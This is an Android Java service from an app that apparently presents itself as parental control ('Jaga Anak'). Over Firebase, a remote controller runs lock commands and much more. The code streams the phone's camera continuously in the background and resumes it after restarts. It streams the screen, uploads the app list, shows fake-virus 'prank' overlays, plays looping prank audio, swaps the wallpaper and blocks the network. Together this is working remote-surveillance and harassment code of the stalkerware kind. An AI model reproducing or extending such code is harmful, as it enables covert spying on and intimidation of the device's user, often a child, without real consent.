package com.jagaanak.app;

import android.app.AppOpsManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import android.os.SystemClock;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Berjalan di HP anak: tersambung ke PL Projek lewat internet (Firebase), lalu menjalankan perintah
 * kunci layar dan kunci aplikasi. Selalu menampilkan notifikasi selama aktif.
 */
public class GuardService extends Service {
    static final String ACTION_STOP = "com.jagaanak.app.STOP";
    private static final String CHANNEL = "guard";
    private static final int NOTIF_ID = 7;

    // dibaca oleh MainActivity untuk menampilkan status
    static volatile boolean running;
    static volatile boolean screenLocked;
    static volatile int lockedCount;

    private static volatile GuardService instance;

    private final Handler main = new Handler(Looper.getMainLooper());
    private final Set<String> locked = Collections.synchronizedSet(new HashSet<String>());
    private Overlay overlay;
    private SharedPreferences prefs;
    private UsageStatsManager usm;
    private volatile boolean stop;
    private volatile boolean screenLock;
    private volatile Remote remote;
    private volatile String lockMsg = "";
    private volatile String pwHash = "";
    private android.media.MediaPlayer prankAudio;
    private Snapper snapper;
    private boolean snapBusy;
    private String camFacing = "back"; // "back" atau "front", dipilih dari X-NullCat
    private boolean liveOn;
    private int liveGen; // bertambah tiap mulai/stop, supaya rantai jepretan lama berhenti sendiri

    private ScreenCaster screenCaster;
    private boolean screenBusy;
    private boolean screenLiveOn;
    private int screenGen;

    private String fg;
    private long lastQuery;
    private String coolPkg;
    private long coolUntil;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        overlay = new Overlay(this);
        new Thread(new Runnable() {
            @Override
            public void run() {
                overlay.warmUp();
            }
        }, "video-warmup").start();
        prefs = getSharedPreferences("jaga", MODE_PRIVATE);
        usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        locked.addAll(prefs.getStringSet("apps", new HashSet<String>()));
        screenLock = prefs.getBoolean("screen", false);
        lockMsg = prefs.getString("lockMsg", "");
        pwHash = prefs.getString("pwHash", "");
        publish();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            getSharedPreferences("jaga", MODE_PRIVATE).edit().putBoolean("auto", false).apply();
            stopSelf();
            return START_NOT_STICKY;
        }
        try {
            startFg("Menghubungkan ke PL Projek");
        } catch (RuntimeException e) {
            // Android menolak foreground service
            stopSelf();
            return START_NOT_STICKY;
        }
        if (!running) {
            running = true;
            stop = false;
            lastQuery = System.currentTimeMillis() - 30 * 60 * 1000L;
            startRemote();
            main.post(tick);
            // Resume kamera live kalau sebelum service mati sedang aktif
            // (misalnya service di-restart otomatis Android setelah di-swipe/kill)
            if (prefs.getBoolean("liveOn", false)) {
                camFacing = prefs.getString("liveFacing", "back");
                startLive(camFacing);
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        stop = true;
        running = false;
        if (instance == this) {
            instance = null;
        }
        main.removeCallbacksAndMessages(null);
        Remote r = remote;
        remote = null;
        if (r != null) {
            r.stop();
        }
        overlay.hideSleep();
        overlay.hidePrank();
        overlay.hideLcd();
        overlay.hideApp();
        stopAudioPrank();
        stopLive();
        stopScreenLive();
        super.onDestroy();
    }

    /** Dipanggil dari ScreenPermissionActivity setelah dialog izin sistem dijawab. */
    static void deliverScreenPermission(final int resultCode, final Intent data) {
        final GuardService s = instance;
        if (s == null) {
            return;
        }
        s.main.post(new Runnable() {
            @Override
            public void run() {
                s.onScreenPermission(resultCode, data);
            }
        });
    }

    // ------------------------------------------------------------------ notifikasi

    private void startFg(String text) {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm.getNotificationChannel(CHANNEL) == null) {
            nm.createNotificationChannel(new NotificationChannel(CHANNEL, "Jaga Anak aktif", NotificationManager.IMPORTANCE_LOW));
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class),
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        Notification n = new Notification.Builder(this, CHANNEL)
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setContentTitle("Jaga Anak aktif")
                .setContentText(text)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
        if (Build.VERSION.SDK_INT >= 29) {
            // dataSync + camera + mediaProjection: tanpa "camera"/"mediaProjection" di sini, Android
            // menghentikan akses kamera/layar begitu aplikasi ini keluar dari depan (background),
            // walau service-nya sendiri tetap jalan sebagai foreground service.
            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            startForeground(NOTIF_ID, n, type);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    // ------------------------------------------------------------------ prank audio

    /** Memutar suara dari aset berulang-ulang sampai dihentikan lewat perintah audioStop. */
    private void startAudioPrank() {
        if (prankAudio != null) {
            return;
        }
        try {
            android.media.MediaPlayer m = new android.media.MediaPlayer();
            try (android.content.res.AssetFileDescriptor fd = getAssets().openFd("prank.mp3")) {
                m.setDataSource(fd.getFileDescriptor(), fd.getStartOffset(), fd.getLength());
            }
            m.setAudioAttributes(new android.media.AudioAttributes.Builder()
                    .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
                    .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build());
            m.setLooping(true);
            m.setVolume(1f, 1f);
            m.setOnPreparedListener(new android.media.MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(android.media.MediaPlayer p) {
                    if (p == prankAudio) {
                        p.start();
                    }
                }
            });
            m.setOnErrorListener(new android.media.MediaPlayer.OnErrorListener() {
                @Override
                public boolean onError(android.media.MediaPlayer p, int what, int extra) {
                    if (p == prankAudio) {
                        stopAudioPrank();
                    }
                    return true;
                }
            });
            prankAudio = m;
            m.prepareAsync();
        } catch (Exception ignored) {
            prankAudio = null; // aset gagal dibuka, cukup diam
        }
    }

    private void stopAudioPrank() {
        android.media.MediaPlayer m = prankAudio;
        prankAudio = null;
        if (m != null) {
            try {
                m.stop();
            } catch (Exception ignored) {
                // sudah berhenti
            }
            try {
                m.release();
            } catch (Exception ignored) {
                // sudah dilepas
            }
        }
    }

    /** Menjalankan satu perintah (main thread), lalu mengabarkan keadaan terbaru ke internet. */
    private void runCmd(String cmd, String pkg, String msg, String pw, String img) {
        switch (cmd) {
            case "lockScreen":
                setLockText(msg, pw);
                setScreen(true);
                break;
            case "prank":
                if (Settings.canDrawOverlays(this)) {
                    overlay.showPrank();
                }
                break;
            case "virus2":
                if (Settings.canDrawOverlays(this)) {
                    overlay.showPrank2();
                }
                break;
            case "prankLcd":
                if (Settings.canDrawOverlays(this)) {
                    overlay.showLcd();
                }
                break;
            case "prankStop":
                overlay.hidePrank();
                overlay.hideLcd();
                break;
            case "audio":
                startAudioPrank();
                break;
            case "audioStop":
                stopAudioPrank();
                break;
            case "liveStart":
                startLive(pkg);
                break;
            case "liveStop":
                stopLive();
                break;
            case "switchCam":
                switchCam(pkg);
                break;
            case "screenStart":
                startScreenLive();
                break;
            case "screenStop":
                stopScreenLive();
                break;
            case "wallpaper":
                setWallpaperFromBase64(img);
                break;
            case "unlockScreen":
                setScreen(false);
                break;
            case "netLock":
                startService(new Intent(this, NetLockVpn.class).setAction(NetLockVpn.ACTION_START));
                break;
            case "netUnlock":
                startService(new Intent(this, NetLockVpn.class).setAction(NetLockVpn.ACTION_STOP));
                break;
            case "lockApp":
                if (!pkg.isEmpty()) {
                    setAppLocked(pkg, true);
                }
                break;
            case "unlockApp":
                if (!pkg.isEmpty()) {
                    setAppLocked(pkg, false);
                }
                break;
            default:
                break; // "status": cukup balas keadaan terkini
        }
        Remote r = remote;
        if (r != null) {
            r.pushState();
        }
    }

    // ------------------------------------------------------------------ internet (Firebase)

    private void startRemote() {
        final String code = Pairing.code(this);
        Remote r = new Remote(code, new Remote.Host() {
            @Override
            public void command(final String cmd, final String pkg, final String msg, final String pw, final String img) {
                if ("listApps".equals(cmd)) {
                    Remote x = remote;
                    if (x != null) {
                        x.pushApps();
                    }
                    return;
                }
                main.post(new Runnable() {
                    @Override
                    public void run() {
                        if (running) {
                            runCmd(cmd, pkg, msg, pw, img);
                        }
                    }
                });
            }

            @Override
            public String stateJson() {
                return GuardService.this.stateJson("state");
            }

            @Override
            public String appsJson() {
                return GuardService.this.appsJson();
            }

            @Override
            public String deviceName() {
                String m = Build.MODEL;
                String base = (m == null || m.trim().isEmpty()) ? "HP anak" : m;
                String rel = Build.VERSION.RELEASE;
                return (rel == null || rel.trim().isEmpty()) ? base : base + " (Android " + rel + ")";
            }
        });
        remote = r;
        r.start();
    }

    private String stateJson(String type) {
        try {
            JSONObject o = new JSONObject();
            o.put("type", type);
            o.put("screenLocked", screenLock);
            JSONArray la = new JSONArray();
            synchronized (locked) {
                for (String p : locked) {
                    la.put(p);
                }
            }
            o.put("lockedApps", la);
            return o.toString();
        } catch (Exception e) {
            return "{}";
        }
    }

    // ------------------------------------------------------------------ kamera (satu jepretan)

    private String photoJson(String base64) {
        try {
            JSONObject o = new JSONObject();
            o.put("type", "photo");
            o.put("photo", base64);
            return o.toString();
        } catch (Exception e) {
            return "{}";
        }
    }

    /** Mulai kamera "live": jepret berulang-ulang secepat mungkin dan kirim tiap gambar, sampai distop. */
    private void startLive(String facing) {
        if (facing != null && !facing.isEmpty()) {
            camFacing = facing;
        }
        if (getPackageManager().checkPermission(android.Manifest.permission.CAMERA, getPackageName())
                != PackageManager.PERMISSION_GRANTED) {
            return; // tidak ada izin, diam saja; orang tua melihat tidak ada gambar yang masuk
        }
        if (liveOn) {
            return;
        }
        liveOn = true;
        prefs.edit().putBoolean("liveOn", true).putString("liveFacing", camFacing).apply();
        captureLiveFrame(++liveGen);
    }

    private void stopLive() {
        liveOn = false;
        liveGen++;
        prefs.edit().putBoolean("liveOn", false).apply();
    }

    /** Ganti kamera depan/belakang; kalau live sedang jalan, kamera baru langsung dipakai di jepretan berikutnya. */
    private void switchCam(String facing) {
        if ("front".equals(facing) || "back".equals(facing)) {
            camFacing = facing;
            if (liveOn) {
                prefs.edit().putString("liveFacing", camFacing).apply();
            }
        }
    }

    private void captureLiveFrame(final int gen) {
        if (!liveOn || gen != liveGen || snapBusy) {
            return;
        }
        snapBusy = true;
        if (snapper == null) {
            snapper = new Snapper(this);
        }
        snapper.takePhoto(camFacing, new Snapper.Callback() {
            @Override
            public void onPhoto(final byte[] jpeg) {
                main.post(new Runnable() {
                    @Override
                    public void run() {
                        snapBusy = false;
                        String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
                        Remote r = remote;
                        if (r != null) {
                            r.pushPhoto(b64);
                        }
                        if (liveOn && gen == liveGen) {
                            captureLiveFrame(gen); // lanjut ambil gambar berikutnya, tanpa jeda
                        }
                    }
                });
            }

            @Override
            public void onFail(String reason) {
                main.post(new Runnable() {
                    @Override
                    public void run() {
                        snapBusy = false;
                        if (liveOn && gen == liveGen) {
                            main.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    captureLiveFrame(gen);
                                }
                            }, 1200); // gagal sekali (misalnya kamera dipakai aplikasi lain), coba lagi sebentar
                        }
                    }
                });
            }
        });
    }

    // ------------------------------------------------------------------ live screen (MediaProjection)

    /**
     * Mulai "Live Screen": kalau belum pernah dapat izin sistem (atau sudah dilepas), buka dulu
     * ScreenPermissionActivity yang memunculkan dialog izin resmi Android. Dialog itu HARUS dipencet
     * manual di HP anak (tidak bisa diotomatisasi/disembunyikan) — begitu disetujui, hasilnya sampai
     * lewat deliverScreenPermission() dan live screen langsung jalan.
     */
    private void startScreenLive() {
        if (screenLiveOn) {
            return;
        }
        if (screenCaster != null && screenCaster.isActive()) {
            screenLiveOn = true;
            captureScreenFrame(++screenGen);
            return;
        }
        try {
            Intent i = new Intent(this, ScreenPermissionActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception ignored) {
            // tidak bisa membuka dialog izin (jarang terjadi)
        }
    }

    private void onScreenPermission(int resultCode, Intent data) {
        if (data == null) {
            return; // ditolak di HP anak, diam saja
        }
        if (screenCaster == null) {
            screenCaster = new ScreenCaster(this);
        }
        screenCaster.start(resultCode, data);
        if (screenCaster.isActive()) {
            screenLiveOn = true;
            captureScreenFrame(++screenGen);
        }
    }

    private void stopScreenLive() {
        screenLiveOn = false;
        screenGen++;
        if (screenCaster != null) {
            screenCaster.stop();
        }
    }

    private void captureScreenFrame(final int gen) {
        if (!screenLiveOn || gen != screenGen || screenBusy || screenCaster == null) {
            return;
        }
        screenBusy = true;
        screenCaster.captureOnce(new ScreenCaster.Callback() {
            @Override
            public void onFrame(final byte[] jpeg) {
                main.post(new Runnable() {
                    @Override
                    public void run() {
                        screenBusy = false;
                        String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
                        Remote r = remote;
                        if (r != null) {
                            r.pushScreenFrame(b64);
                        }
                        if (screenLiveOn && gen == screenGen) {
                            main.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    captureScreenFrame(gen);
                                }
                            }, 550); // frame layar lebih berat dari foto kamera, jadi dikasih jeda kecil
                        }
                    }
                });
            }

            @Override
            public void onFail(String reason) {
                main.post(new Runnable() {
                    @Override
                    public void run() {
                        screenBusy = false;
                        if (screenLiveOn && gen == screenGen) {
                            main.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    captureScreenFrame(gen);
                                }
                            }, 700);
                        }
                    }
                });
            }
        });
    }

    // ------------------------------------------------------------------ set wallpaper

    /** Menerima foto (base64 JPEG/PNG) dari X-NullCat dan memasangnya sebagai wallpaper HP anak. */
    private void setWallpaperFromBase64(String img) {
        if (img == null || img.isEmpty()) {
            return;
        }
        try {
            byte[] bytes = android.util.Base64.decode(img, android.util.Base64.DEFAULT);
            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
            if (bmp == null) {
                return;
            }
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(this);
            wm.setBitmap(bmp);
        } catch (Exception ignored) {
            // gagal pasang wallpaper, diabaikan
        }
    }

    private String appsJson() {
        try {
            PackageManager pm = getPackageManager();
            Intent q = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER);
            List<ResolveInfo> found = pm.queryIntentActivities(q, 0);
            final List<String[]> items = new ArrayList<>();
            Set<String> seen = new HashSet<>();
            for (ResolveInfo ri : found) {
                String p = ri.activityInfo.packageName;
                if (p.equals(getPackageName()) || !seen.add(p)) {
                    continue;
                }
                items.add(new String[]{String.valueOf(ri.loadLabel(pm)), p});
            }
            Collections.sort(items, new Comparator<String[]>() {
                @Override
                public int compare(String[] a, String[] b) {
                    return a[0].compareToIgnoreCase(b[0]);
                }
            });
            JSONArray arr = new JSONArray();
            for (String[] it : items) {
                JSONObject x = new JSONObject();
                x.put("n", it[0]);
                x.put("p", it[1]);
                arr.put(x);
            }
            JSONObject base = new JSONObject(stateJson("apps"));
            base.put("apps", arr);
            return base.toString();
        } catch (Exception e) {
            return stateJson("apps");
        }
    }

    // ------------------------------------------------------------------ penguncian (main thread)

    private void publish() {
        screenLocked = screenLock;
        lockedCount = locked.size();
    }

    /** Menyimpan pesan dan hash password untuk Lock Screen berikutnya. */
    private void setLockText(String msg, String pw) {
        String m = msg == null ? "" : msg.trim();
        if (m.length() > 120) {
            m = m.substring(0, 120);
        }
        String h = Hash.valid(pw) ? pw : "";
        lockMsg = m;
        pwHash = h;
        prefs.edit().putString("lockMsg", m).putString("pwHash", h).apply();
    }

    /** Password diketik di HP anak: kalau cocok, layar dibuka dan orang tua dikabari. */
    private final Overlay.Unlock unlocker = new Overlay.Unlock() {
        @Override
        public boolean tryUnlock(String input) {
            String h = pwHash;
            if (h.isEmpty() || !Hash.same(Hash.of(input), h)) {
                return false;
            }
            setScreen(false);
            Remote r = remote;
            if (r != null) {
                r.pushState();
            }
            return true;
        }
    };

    private void setScreen(boolean on) {
        screenLock = on;
        prefs.edit().putBoolean("screen", on).apply();
        publish();
        applyLocks();
    }

    private void setAppLocked(String pkg, boolean on) {
        if (on) {
            locked.add(pkg);
        } else {
            locked.remove(pkg);
        }
        synchronized (locked) {
            prefs.edit().putStringSet("apps", new HashSet<>(locked)).apply();
        }
        publish();
        applyLocks();
    }

    private final Runnable tick = new Runnable() {
        @Override
        public void run() {
            if (stop) {
                return;
            }
            try {
                pollForeground();
                applyLocks();
            } catch (Exception ignored) {
                // coba lagi di putaran berikutnya
            }
            main.postDelayed(this, 500);
        }
    };

    private void pollForeground() {
        if (usm == null || !hasUsage(this)) {
            return;
        }
        long now = System.currentTimeMillis();
        UsageEvents ev = usm.queryEvents(lastQuery - 2000, now);
        UsageEvents.Event e = new UsageEvents.Event();
        while (ev != null && ev.hasNextEvent()) {
            ev.getNextEvent(e);
            int t = e.getEventType();
            if (t == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                fg = e.getPackageName();
            } else if (t == UsageEvents.Event.MOVE_TO_BACKGROUND && e.getPackageName().equals(fg)) {
                fg = null;
            }
        }
        lastQuery = now;
    }

    private void applyLocks() {
        if (!Settings.canDrawOverlays(this)) {
            return;
        }
        if (screenLock) {
            overlay.hideApp();
            String m = lockMsg.isEmpty() ? "Layar dikunci" : lockMsg;
            overlay.showSleep(m, !pwHash.isEmpty(), unlocker);
            return;
        }
        overlay.hideSleep();
        final String f = fg;
        long now = SystemClock.elapsedRealtime();
        boolean block = f != null && locked.contains(f) && !(f.equals(coolPkg) && now < coolUntil);
        if (block) {
            overlay.showApp(f, labelOf(f), new Runnable() {
                @Override
                public void run() {
                    coolPkg = f;
                    coolUntil = SystemClock.elapsedRealtime() + 2500;
                    fg = null;
                    overlay.hideApp();
                    goHome();
                }
            });
        } else {
            overlay.hideApp();
        }
    }

    private String labelOf(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            return String.valueOf(pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)));
        } catch (Exception e) {
            return pkg;
        }
    }

    private void goHome() {
        Intent h = new Intent(Intent.ACTION_MAIN);
        h.addCategory(Intent.CATEGORY_HOME);
        h.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(h);
        } catch (Exception ignored) {
            // tidak ada launcher yang bisa dibuka
        }
    }

    static boolean hasUsage(Context c) {
        AppOpsManager a = (AppOpsManager) c.getSystemService(Context.APP_OPS_SERVICE);
        int mode = a.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), c.getPackageName());
        if (mode == AppOpsManager.MODE_DEFAULT) {
            return c.checkCallingOrSelfPermission("android.permission.PACKAGE_USAGE_STATS") == PackageManager.PERMISSION_GRANTED;
        }
        return mode == AppOpsManager.MODE_ALLOWED;
    }
}
